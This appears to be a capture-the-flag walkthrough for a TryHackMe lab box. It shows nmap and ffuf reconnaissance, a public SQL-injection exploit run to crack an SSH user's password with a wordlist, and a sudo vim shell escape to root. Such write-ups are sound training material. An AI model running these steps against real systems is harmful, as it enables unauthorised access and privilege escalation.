```
┌──(xnv㉿xnv)-[~/thm/simple]
└─$ nmap -A 10.10.230.177

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.4.167
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
_______________________________________________________________________________________________________
FFUF /
index.html              [Status: 200, Size: 11321, Words: 3503, Lines: 376]
robots.txt              [Status: 200, Size: 929, Words: 176, Lines: 33]
simple                  [Status: 301, Size: 315, Words: 20, Lines: 10]
_______________________________________________________________________________________________________
FFUF /simple/

modules                 [Status: 301, Size: 323, Words: 20, Lines: 10]
uploads                 [Status: 301, Size: 323, Words: 20, Lines: 10]
doc                     [Status: 301, Size: 319, Words: 20, Lines: 10]
admin                   [Status: 301, Size: 321, Words: 20, Lines: 10]
assets                  [Status: 301, Size: 322, Words: 20, Lines: 10]
lib                     [Status: 301, Size: 319, Words: 20, Lines: 10]
config.php              [Status: 200, Size: 0, Words: 1, Lines: 1]
tmp                     [Status: 301, Size: 319, Words: 20, Lines: 10]
```

```
┌──(xnv㉿xnv)-[~/thm/simple]
└─$ python3 pyload.py -u http://10.10.230.177/simple/ --crack -w /usr/share/seclists/Passwords/Common-Credentials/best110.txt

payload : https://www.exploit-db.com/exploits/46635

mitch / ******
```

```
┌──(xnv㉿xnv)-[~]
└─$ ssh mitch@10.10.230.177 -p 2222
```

```
$ cat user.txt
**************************
```

```
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

```
$ sudo /usr/bin/vim -c ':!/bin/sh'
```

```
# cat /root/root.txt
W3ll d0n3. You made it!
```